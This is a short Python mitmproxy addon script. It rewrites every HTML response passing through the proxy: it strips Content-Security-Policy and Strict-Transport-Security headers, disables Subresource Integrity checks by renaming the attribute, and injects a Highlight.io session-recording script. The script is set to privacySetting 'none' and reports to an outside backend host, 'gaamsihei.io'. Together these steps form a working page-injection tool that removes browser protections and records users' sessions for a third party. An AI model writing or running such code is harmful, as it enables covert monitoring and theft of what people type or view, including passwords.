from mitmproxy import http

SNIPPET = """
    <script src="https://unpkg.com/highlight.run"></script>
    <script>
      H.init("1", {
        environment: "prod",
        privacySetting: 'none',
        disableMetrics: true,
        backendUrl: "https://gaamsihei.io/public",
        networkRecording: {
          enabled: false,
        },
        enableBackendTracing: false, 
        otel: {
          instrumentations: {
            '@opentelemetry/instrumentation-user-interaction': false,
            '@opentelemetry/instrumentation-document-load': false,
            '@opentelemetry/instrumentation-xml-http-request': false,
            '@opentelemetry/instrumentation-fetch': false,
          }
        },
      });
    </script>
"""

def response(flow: http.HTTPFlow):
    if "text/html" in flow.response.headers.get("Content-Type", ""):
        flow.response.decode()

        # 2. Kill Security Policies
        flow.response.headers.pop("Content-Security-Policy", None)
        flow.response.headers.pop("Content-Security-Policy-Report-Only", None)
        flow.response.headers.pop("Strict-Transport-Security", None)
        
        # 3. Strip Integrity Checks (SRI)
        flow.response.text = flow.response.text.replace("integrity=", "data-shmintegrity=")

        # 4. Inject Highlight.io
        if "<head>" in flow.response.text:
            flow.response.text = flow.response.text.replace("<head>", f"<head>{SNIPPET}", 1)
